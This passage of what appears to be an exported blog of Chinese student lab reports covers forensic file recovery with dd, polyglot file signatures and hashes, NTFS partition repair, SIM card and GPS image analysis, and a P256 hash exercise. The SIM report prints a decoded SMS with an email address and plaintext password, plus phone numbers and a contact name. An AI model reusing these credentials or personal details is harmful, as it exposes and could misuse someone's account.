<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/5.1.png" alt="运行程序得到的结果" /></p>
<p>3、输入 <code>cd /mnt/forensics</code> 指令切换到&quot;/mnt/forensics&quot;目录，然后输入 <code>sudo rm -f readme.txt</code> 指令删除 readme.txt 文件。</p>
<p>4、输入 <code>sudo umount /mnt/forensics</code> 指令卸载已挂载的 FAT 分区。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/5.2.png" alt="运行程序得到的结果" /></p>
<h2 id="task6"><a class="markdownIt-Anchor" href="#task6"></a> Task6</h2>
<p>步骤：</p>
<p>1、输入 <code>dd if=partition1.dd of=fat0.dd bs=512 skip=6316 count=1</code> 指令将 partition1.dd 的 fat0 的部分存储到 fat0.dd 文件中，输入 <code>ghex fat0.dd</code> 修改为下图所示：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.1.png" alt="运行程序得到的结果" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.2.png" alt="运行程序得到的结果" /></p>
<p>2、输入 <code>dd if=partition1.dd of=rootdir.dd bs=512 skip=8192 count=1</code> 指令将 partition1.dd 的第3个簇的部分存储到 rootdir.dd 文件中，输入 <code>ghex rootdir.dd</code> 修改为下图所示：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.3.png" alt="运行程序得到的结果" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.4.png" alt="运行程序得到的结果" /></p>
<p>3、输入 <code>dd if=partition1.dd of=recover.dd bs=512 skip=0 count=6316</code> ；<br />
<code>dd if=fat0.dd bs=512 skip=0 count=1 &gt;&gt;recover.dd</code> ；<code>dd if=partition1.dd bs=512 skip=6317 count=1875 &gt;&gt;recover.dd</code> ；<code>dd if=rootdir.dd bs=512 skip=0 count=1 &gt;&gt;recover.dd</code> ；<code>dd if=partition1.dd bs=512 skip=8193 count=240030 &gt;&gt;recover.dd</code> 指令，将所有文件整合在一起。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.5.png" alt="运行程序得到的结果" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.6.png" alt="运行程序得到的结果" /></p>
<p>4、输入 <code>sudo mount -o rw /home/kali/Desktop/recover.dd /mnt/forensics</code> 将 recover.dd 挂载到 /mnt/forensics 目录下；输入 <code>cd /mnt/forensics</code> 进入到该目录下；输入 <code>ls</code> 发现readme.txt 文件已经恢复。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.7.png" alt="运行程序得到的结果" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/6.8.png" alt="运行程序得到的结果" /></p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-6</title>
    <url>/posts/8e92b27e.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>了解哈希、文件签名、隐写术。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有 x-ways forensics 的 windows 系统、file signature test 文件。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、这个文件默认 pdf 拓展名，可以正常打开查看。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.1.png" alt="以PDF形式打开" /></p>
<p>2、改成 zip 拓展名，依然可以打开查看。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.2.png" alt="以ZIP形式打开" /></p>
<p>3、改成 html，打开后按提示操作，又可以生成 png、exe、mp4 格式的文件，而且全部可以打开查看。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.3.png" alt="以HTML形式打开，并将PDF文件拖入其中" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.4.png" alt="生成.ex,.mp4,.png,.pdf文件" /></p>
<p>（上面的操作在主机中进行，接下来的操作都在虚拟机 win7 中进行）</p>
<p>4、打开 x-ways forensics 先在 help -- setting 中把语言改为中文，然后在 文件 -- 创建案例 中创建新案例。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.5.png" alt="创建新案例" /></p>
<p>5、打开 文件 -- 打开目录，打开文件所在目录。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.6.png" alt="打开文件目录" /></p>
<p>6、选中带计算文件，在 专业工具 -- 磁盘快照 中进行 MD5 计算。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.7.png" alt="计算 md5 值" /></p>
<p>7、发现未显示 md5 值，单击项目名称列表上面一行，打开显示列表，更改 md5 值为 500，发现 md5 值已经显示且都相同。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.8.png" alt="显示 md5 值" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.9.png" alt="计算 md5 值" /></p>
<p>8、计算 sha1 值，发现并不完全相同：由网页生成的 mp4 文件、ex 文件和 png 文件拥有不同的 sha1 值，而之前直接改后缀的 zip 文件、html 文件、pdf 文件和 网页生成的 pdf 文件拥有相同的 sha1 值。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.10.png" alt="sha1 值不同" /></p>
<p>9、查看文件签名：可以发现一个文件有多个不同的签名。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_6/1.11.png" alt="sha1 值不同" /></p>
<h1 id="探究报告"><a class="markdownIt-Anchor" href="#探究报告"></a> 探究报告</h1>
<h2 id="查看这些文件的签名是否一致"><a class="markdownIt-Anchor" href="#查看这些文件的签名是否一致"></a> 查看这些文件的签名，是否一致</h2>
<p>答：并不完全相同：由网页生成的 mp4 文件、ex 文件和 png 文件拥有不同的签名，而之前直接改后缀的 zip 文件、html 文件、pdf 文件和 网页生成的 pdf 文件拥有相同的签名。</p>
<h2 id="上述-pdf-文件和-html-及-zip-文件为什么更改拓展名后可以被不同应用打开"><a class="markdownIt-Anchor" href="#上述-pdf-文件和-html-及-zip-文件为什么更改拓展名后可以被不同应用打开"></a> 上述 pdf 文件和 html 及 zip 文件，为什么更改拓展名后可以被不同应用打开</h2>
<p>答：一个文件内含有多个文件签名，不同的应用程序在读取这个文件时，只找对应的文件签名部分读取。</p>
<h2 id="取证软件对上述文件进行签名分析的结果及启示文件签名的用途及理解及局限"><a class="markdownIt-Anchor" href="#取证软件对上述文件进行签名分析的结果及启示文件签名的用途及理解及局限"></a> 取证软件对上述文件进行签名分析的结果及启示（文件签名的用途及理解及局限）</h2>
<p>1、文件签名的用途：文件签名是一种用来识别文件类型的技术，它是一种特定的字节序列，它们出现在文件的特定位置，用来识别文件的类型。</p>
<p>2、文件签名的理解：文件签名是一种特定的字节序列，它们出现在文件的特定位置，用来识别文件的类型。不同的应用程序在读取这个文件时，只找对应的文件签名部分读取。</p>
<p>3、文件签名的局限性在于，一个文件不一定只有一个文件签名，所以找到某个格式的签名不能作为判断这个文件的唯一标准。</p>
<h2 id="上述所有文件的-md5-sha1-值比对情况"><a class="markdownIt-Anchor" href="#上述所有文件的-md5-sha1-值比对情况"></a> 上述所有文件的 md5、sha1 值比对情况</h2>
<p>答：md5 值完全相同，sha1 值并不完全相同：由网页生成的 mp4 文件、ex 文件和 png 文件拥有不同的 sha1 值，而之前直接改后缀的 zip 文件、html 文件、pdf 文件和 网页生成的 pdf 文件拥有相同的 sha1 值。</p>
<h2 id="对取证的启示"><a class="markdownIt-Anchor" href="#对取证的启示"></a> 对取证的启示</h2>
<p>1、留心文件大小：超出正常格式大小太多的文件，很可能隐藏了其他文件。</p>
<p>2、更改拓展名不会更改文件内容，只会更改打开该文件的默认应用，而相应的应用会打开不同的部分，因此可以被不同应用打开。</p>
<p>3、md5 值易被碰撞，md5 值相同其他 hash 值不一定相同。</p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-7</title>
    <url>/posts/f99582e8.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>学会使用 winhex 恢复硬盘分区。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有 winhex 的 windows 系统、shiyan7.vhd 文件。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、将 shiyan.vhd 挂载到C盘。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
<p>2、搜索 NTFS 的 MBR 十六进制特征码 EB5290 。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.2.png" alt="搜索结果" /></p>
<p>3、分析得第一个扇区的信息：分区大小（在偏移 0x28H处） ：344063（0x53fff），结束扇区（见左下角）：344191（0x54080）；相减得起始扇区：128（80）。同理可得第二个扇区的信息：分区大小：303103（0x49fff） ，结束位置：647295（9e07f），起始扇区：344192（54080）。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.3.png" alt="第一个扇区的信息" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.4.png" alt="第二个扇区的信息" /></p>
<p>4、在分区最前面找到分区终止符 55 AA ，在前面修改为正确分区。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.5.png" alt="扇区信息修改前" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.6.png" alt="扇区信息修改后" /></p>
<p>5、保存后发现成功分区。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.7.png" alt="磁盘管理显示分区成功" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.8.png" alt="winhex显示分区成功" /></p>
<p>6、在第一个分区的 MFT 中 ctrl + f 搜索关键词 abc.txt 。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.9.png" alt="搜索关键词 abc.txt" /></p>
<p>7、经过尝试发现搜索结果2是有效的。在上方复制并查找16进制数值。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.10.png" alt="查找16进制数值" /></p>
<p>8、由下图可以获取以下消息：文件大小：1B52(十进制 6994)；簇数：D502；首簇号：07(十进制 07)。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.11.png" alt="获取文件信息" /><br />
9、ctrl + g 搜索首簇号的位置。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.12.png" alt="搜索搜簇号的位置" /></p>
<p>10、alt + g 输入文件大小查找末bit的位置。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.13.png" alt="寻找末bit的位置" /><br />
<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.14.png" alt="末bit的位置" /></p>
<p>11、保存为abc.txt，恢复成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_7/1.15.png" alt="abc.txt的部分内容" /></p>
<p><a href="https://jingyan.baidu.com/article/a24b33cd4cf08358ff002b3f.html">参考文章1</a><br />
<a href="http://www.webkaka.com/info/archives/system/2015/05/282147/">参考文章2</a></p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-9</title>
    <url>/posts/1e2dafef.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>了解 SIM 卡中存储的信息，学会对其进行取证分析。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有 winhex 的 windows 系统、SIM_2G_3G SIM.zip 文件。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>问题<br />
1、手动在镜像文件中找到最后一个联系人和对应的号码。提示：所有的联系人都存储在基本文件 6F3A 中。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.1.png" alt="最后一个联系人和对应的号码" /></p>
<p>由此可知，最后一个联系人对应的号码所记录的内容为 0x06810391098011。其中0x06表示电话号码为6个字节，0x81表示该号码是一个未知的电话号码，接下来的 0x0391098011按反向半字节格式存储可知号码为 3019900811。而向上寻找可以得知，联系人姓名为Woody Woolenson。</p>
<p>问题 2、找到属于 Hanco Car 的号码。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.2.png" alt="无法找到属于 Hanco Car 的号码" /></p>
<p>无法找到属于 Hanco Car 的号码。</p>
<p>问题 3、SIM 卡文件系统转储中共包含多少条信息。</p>
<p>共包含 12+28+2=42 条信息。</p>
<p>问题 4、对转储的 SIM 卡文件系统中最后一条短信的各部分进行转换，确保解码短信中所有记录。提示：短信在目录 3F00/7F10/下的 6F3C 文件中。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.3.png" alt="最后一条短信" /></p>
<p>由此可知，最后一条短信为上图所示。其中 0x00 表示该短信为未读状态；0x07 表示接下来七个字节为服务中心号码；0x91 表示接下来是一个国际号码；0x2160130310F2 表示服务中心号码为1206313012；接下来的 0x91 表示接下来是一个国际号码；0x2104374120F2 表示发送者号码为 12407314022；0x00 表示使用默认的 7 位编码来编码短信正文；0x608072615033 表示时间为 2006 年 8 月 27 日，时间为 16:05:33；接下来的内容为短信内容，解码后为Email: <a href="mailto:nuthanhtran@hotmail.com">nuthanhtran@hotmail.com</a> Password: kevinhong</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.4.png" alt="短信内容解码" /></p>
<p>问题 5、确定文件系统镜像文件中是否包含删除的短信。</p>
<p>由问题 4 的短信可知，该短信已被删除，因此文件系统镜像文件中包含删除的短信。</p>
<p>问题 6、这张 SIM 卡的 ICCID 是什么，并对 ICCID 进行简要分析。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_9/1.5.png" alt="SIM 卡的 ICCID 内容" /></p>
<p>由此可知，0x98 表示由全球电信行业分配的标识符；0x012 用于标识 SIM 卡发行的国家；0x602 指示 SIM 卡注册的移动网络；0x012559597 是 SIM 卡的具体序列号；0xF 用于确保 ICCID 的完整性和正确性。</p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-8</title>
    <url>/posts/692a9f79.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>认识 GPS 设备中存储的信息，并运用工具进行简单分析。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有 AccessData FTK Imager、GPX Editor 的 PC、gps.dd.001 文件。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、添加 gps.dd.001 的 GPS 设备镜像作为证据项。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.1.png" alt="添加 gps.dd.001" /></p>
<p>2、导出 GPX 文件。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.2.png" alt="导出 GPX 文件" /></p>
<p>根据 current.gpx 文件的内容，可以回答以下问题：</p>
<p>问题 1、在&quot;current.gpx&quot;文件中有多少个航迹点？</p>
<p>查阅资料可知，航迹点在文本文档中用 &lt;trkpt<br />
来表示，因此只需要在文本编辑器中搜索 &lt;trkpt 即可得到航迹点的数量。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.3.png" alt="搜索 trkpt" /></p>
<p>由此可知，在&quot;current.gpx&quot;文件中有7626个航迹点。</p>
<p>问题 2、在&quot;current.gpx&quot;文件中第一个航迹点的经纬度是多少？</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.4.png" alt="第一个航迹点的经纬度" /></p>
<p>由此可知，第一个航迹点的维度为43.813697N，经度为79.361316W。</p>
<p>问题 3、在&quot;current.gpx&quot;文件中有多少个航点？</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_8/1.5.png" alt="第一个航迹点的经纬度" /></p>
<p>由此可知，在&quot;current.gpx&quot;文件中有45个航点。</p>
<p>问题 4、在&quot;current.gpx&quot;文件中第一个航点的经纬度是多少</p>
<p>由图 5 可知，第一个航点的纬度为44.133530N，经度为79.131322W。</p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Digital-Currency-and-Blockchain-Lab-1</title>
    <url>/posts/3ed4a3d8.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>  1、仔细阅读 <a href="https://github.com/lc6chang/ecc-pycrypto/blob/master/ecc/curve.py">curve.py</a> 的源代码</p>
<p>  2、理解每个函数之间的关系</p>
<p>  3、熟悉椭圆曲线上的运算操作。</p>
<h1 id="实验器材"><a class="markdownIt-Anchor" href="#实验器材"></a> 实验器材</h1>
<p>  1、编译器：Vscode</p>
<p>  2、操作系统：windows10</p>
<p>  3、编程语言：Python 3.10.11</p>
<p>  4、库：ecc-pycrypto</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>  本次实验基于 Python 以及 ecc-pycrypto 库来实现。其中我们将使用ecc-pycrypto 库中的 P256 椭圆曲线的一个简单实现。</p>
<h1 id="哈希函数"><a class="markdownIt-Anchor" href="#哈希函数"></a> 哈希函数</h1>
<h2 id="问题1"><a class="markdownIt-Anchor" href="#问题1"></a> 问题1</h2>
<p>  在Setup函数中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi></mrow><annotation encoding="application/x-tex">g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span>表示P256的生成元，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>为随机数，计算得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><mi>g</mi><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K=(g,h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>即为生成的公钥对。而在Hash(G,H,M)中，利用离散对数构造Hash函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>g</mi><mi>m</mi></msup><mo>+</mo><msup><mi>h</mi><mi>r</mi></msup></mrow><annotation encoding="application/x-tex">c=g^m+h^r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.858832em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span></span></span></span></span></span></span>即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ecc.curve <span class="keyword">import</span> P256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = random.randint(<span class="number">1</span>, P256.n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Setup</span>():</span><br><span class="line">    k = random.randint(<span class="number">1</span>, P256.n)</span><br><span class="line">    g = P256.G</span><br><span class="line">    h = g * k</span><br><span class="line">    <span class="keyword">return</span> g, h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hash</span>(<span class="params">G, H, M</span>):</span><br><span class="line">    h_0 = G * M + H * r</span><br><span class="line">    <span class="keyword">return</span> h_0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">51631313547153435441543815468315648351471524</span></span><br><span class="line"><span class="number">6813546839164381543154687315413536418136456941835</span></span><br><span class="line">g, h = Setup()</span><br><span class="line">h_0 = Hash(g, h, m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r = &quot;</span>, r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g = &quot;</span>, g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h = &quot;</span>, h_0)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hash(K, M) = &quot;</span>, h_0.x)</span><br></pre></td></tr></table></figure>
<h2 id="问题2"><a class="markdownIt-Anchor" href="#问题2"></a> 问题2</h2>
<p>  对SetupInsecure函数不仅产生哈希函数的密钥K，也输出离散对数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=log_g(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>，在FindCol函数中利用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mn>2</mn></msub><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo>∗</mo><mi>k</mi><mo>=</mo><msub><mi>X</mi><mn>1</mn></msub><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">X_2+r_2*k=X_1+r_1*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span 